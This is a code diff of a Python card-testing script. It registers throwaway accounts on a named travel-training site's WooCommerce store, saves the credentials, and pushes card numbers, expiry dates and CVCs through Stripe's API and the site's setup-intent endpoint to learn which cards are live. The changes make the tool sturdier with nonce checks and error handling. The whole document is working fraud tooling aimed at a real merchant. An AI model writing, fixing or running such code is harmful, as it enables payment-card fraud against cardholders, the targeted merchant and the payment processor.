@@ -5,13 +5,13 @@ import time
 import string
 from bs4 import BeautifulSoup
 
-# Helper function to generate random email (previously undefined)
+# Generate random email
 def generate_random_email():
     domain = random.choice(['gmail.com', 'yahoo.com', 'outlook.com'])
     name = ''.join(random.choices(string.ascii_lowercase, k=10))
     return f"{name}@{domain}"
 
-# Common headers and session creation moved to helper functions
+# Create headers for requests
 def create_headers():
     return {
         'authority': 'www.thetravelinstitute.com',
@@ -20,11 +20,13 @@ def create_headers():
         'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
     }
 
+# Create a session with headers
 def create_session():
     session = requests.Session()
     session.headers.update(create_headers())
     return session
 
+# Process credit card details
 def process_cc(ccx):
     ccx = ccx.strip()
     try:
@@ -39,40 +41,51 @@ def process_cc(ccx):
         print(f"Error processing CC: {e}")
         return None
 
+# Register user and return session
 def register_user(session):
     try:
         email = generate_random_email()
         response = session.get('https://www.thetravelinstitute.com/register/', timeout=20)
         soup = BeautifulSoup(response.text, 'html.parser')
-        
-        nonce = soup.find('input', {'id': 'afurd_field_nonce'})['value']
-        noncee = soup.find('input', {'id': 'woocommerce-register-nonce'})['value']
+
+        nonce = soup.find('input', {'id': 'afurd_field_nonce'})
+        noncee = soup.find('input', {'id': 'woocommerce-register-nonce'})
+
+        if not nonce or not noncee:
+            print("❌ Failed to retrieve nonce values. Site structure might have changed.")
+            return False
 
         data = {
-            'afurd_field_nonce': nonce,
+            'afurd_field_nonce': nonce['value'],
             '_wp_http_referer': '/register/',
             'email': email,
-            'password': 'Esahatam2009@',
-            'woocommerce-register-nonce': noncee,
+            'password': 'TestPass123!',
+            'woocommerce-register-nonce': noncee['value'],
             'register': 'Register',
         }
 
         response = session.post('https://www.thetravelinstitute.com/register/', data=data, timeout=20)
         if response.status_code == 200:
             with open('Creds.txt', 'a') as f:
-                f.write(f"{email}:Esahatam2009@\n")
+                f.write(f"{email}:TestPass123!\n")
             return True
         return False
     except Exception as e:
         print(f"Registration error: {e}")
         return False
 
+# Check credit card via Stripe
 def check_card(session, cc, mm, yy, cvc):
     try:
         response = session.get('https://www.thetravelinstitute.com/my-account/add-payment-method/', timeout=20)
-        nonce = re.search(r'createAndConfirmSetupIntentNonce":"([^"]+)"', response.text).group(1)
+        nonce_match = re.search(r'createAndConfirmSetupIntentNonce":"([^"]+)"', response.text)
 
-        # Stripe API request
+        if not nonce_match:
+            print("❌ Failed to extract nonce for payment processing.")
+            return "Error extracting nonce"
+
+        nonce = nonce_match.group(1)
+
         stripe_headers = {
             'authority': 'api.stripe.com',
             'accept': 'application/json',
@@ -92,13 +105,16 @@ def check_card(session, cc, mm, yy, cvc):
         }
 
         response = requests.post('https://api.stripe.com/v1/payment_methods', headers=stripe_headers, data=stripe_data, timeout=20)
-        response.raise_for_status()
-        
-        payment_method_id = response.json().get('id')
+        response_json = response.json()
+
+        if response.status_code != 200:
+            print(f"❌ Stripe Error: {response_json}")
+            return "Stripe request failed"
+
+        payment_method_id = response_json.get('id')
         if not payment_method_id:
             return "Error: No payment method ID"
 
-        # Process payment confirmation
         confirm_data = {
             'action': 'create_and_confirm_setup_intent',
             'wc-stripe-payment-method': payment_method_id,
@@ -110,10 +126,11 @@ def check_card(session, cc, mm, yy, cvc):
                               params={'wc-ajax': 'wc_stripe_create_and_confirm_setup_intent'},
                               data=confirm_data,
                               timeout=20)
-        response.raise_for_status()
         
-        return response.json().get('msg', 'No message in response')
-    
+        result = response.json().get('msg', 'No message in response')
+        print(f"✅ Stripe Response: {result}")
+        return result
+
     except Exception as e:
         print(f"Payment processing error: {e}")
         return "Error processing payment"
@@ -129,7 +146,4 @@ def Tele(ccx):
     
     result = check_card(session, *cc_data)
     return result
-
-def Tele1(ccx):
-    # Can be refactored to share same logic as Tele
-    return Tele(ccx)
+    
